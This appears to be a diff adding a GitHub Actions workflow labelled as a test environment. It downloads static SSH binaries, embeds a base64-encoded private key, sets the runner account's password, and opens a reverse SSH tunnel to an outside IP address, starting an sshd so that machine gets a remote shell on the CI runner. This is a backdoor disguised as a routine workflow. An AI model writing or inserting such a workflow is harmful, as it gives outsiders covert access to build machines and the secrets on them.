@@ -1,0 +1,40 @@
+name: Test Workflow ENV
+
+on:
+  workflow_dispatch
+  
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+    - name: Install dependencies
+      run: |
+        sudo apt update && sudo apt install -y git openssh-server curl socat nmap net-tools
+        
+    - name: Prepare env
+      run: |
+        wget https://github.com/ernw/static-toolbox/releases/download/1.0.4/sshd-OpenSSH_7.9p1-x86_64
+        mv sshd-OpenSSH_7.9p1-x86_64 sshd
+        wget https://github.com/ernw/static-toolbox/releases/download/1.0.4/ssh-OpenSSH_7.9p1-x86_64
+        mv ssh-OpenSSH_7.9p1-x86_64 ssh
+        chmod +x ssh sshd
+        
+        git clone https://github.com/takeshixx/tools.git
+        PKEY="ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDkyUZbqQxiEgRo4rhWRryZv0AjDn3QZGfSk48QGlhnZ workflow@test"
+        echo "$PKEY" > id_ed25519.pub
+        PKEY2="LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFNd0FBQUF0emMyZ3RaVwpReU5UVXhPUUFBQUNBYldJckhGZkJ1c2diRFlsZGVqSXhnRXF2M01DeTh3SXdMemI5L2RhMFNtZ0FBQUpDWmhKZTdtWVNYCnV3QUFBQXR6YzJndFpXUXlOVFV4T1FBQUFDQWJXSXJIRmZCdXNnYkRZbGRlakl4Z0VxdjNNQ3k4d0l3THpiOS9kYTBTbWcKQUFBRUI1dVBMYStIVUhtNTZ4V1gwVDJLOG8ySE0wZkpUNXhubGZFM2NDdkVsVGlSdFlpc2NWOEc2eUJzTmlWMTZNakdBUwpxL2N3TEx6QWpBdk52MzkxclJLYUFBQUFDM0JsYm5SbGMzUkFZbVpuQVFJPQotLS0tLUVORCBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0K"
+        echo "$PKEY2" | base64 -d > test
+        chmod 600 test
+        
+        curl -s https://myip.space > /tmp/myip
+        cat /tmp/myip
+        id
+        sudo mkdir /var/empty
+        echo "runner:test123" | sudo chpasswd
+        
+    - name: Run
+      run: |
+        ./ssh -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no -i test -p 9090 -R 2222:127.0.0.1:2222 -N -f pentest@212.102.231.44
+        sudo tools/net/sshd.sh 2222 -k id_ed25519.pub -r none -s ./sshd
+      
+        
